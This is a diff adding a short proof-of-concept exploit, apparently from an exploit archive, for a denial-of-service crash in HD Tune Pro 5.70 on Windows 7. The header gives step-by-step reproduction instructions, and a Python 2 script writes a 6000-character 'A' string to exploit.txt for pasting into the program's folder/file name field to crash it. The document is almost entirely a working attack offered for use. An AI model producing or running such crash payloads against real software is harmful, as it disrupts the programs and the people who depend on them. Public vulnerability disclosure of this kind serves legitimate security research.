@@ -1,0 +1,25 @@
+# Exploit Title: HD Tune Pro 5.70 - Denial Of Service (PoC)
+# Author: Gionathan "John" Reale
+# Discovey Date: 2018-08-29
+# Homepage: https://www.hdtune.com/
+# Software Link: https://www.hdtune.com/download.html
+# Tested Version: v5.70
+# Tested on OS: Windows 7 32-bit
+# Steps to Reproduce: Run the python exploit script, it will create a new 
+# file with the name "exploit.txt". Copy the content of the new file "exploit.txt". 
+# Now start the program, when inside the program click "File" > "Options.." > "Save". Now in the field named: "Folder / file name" paste the "exploit.txt" content copied eariler.
+# Click "Apply" > "OK" and see a crash!  
+
+#!/usr/bin/python
+   
+buffer = "A" * 6000
+
+payload = buffer
+try:
+    f=open("exploit.txt","w")
+    print "[+] Creating %s bytes evil payload.." %len(payload)
+    f.write(payload)
+    f.close()
+    print "[+] File created!"
+except:
+    print "File cannot be created"
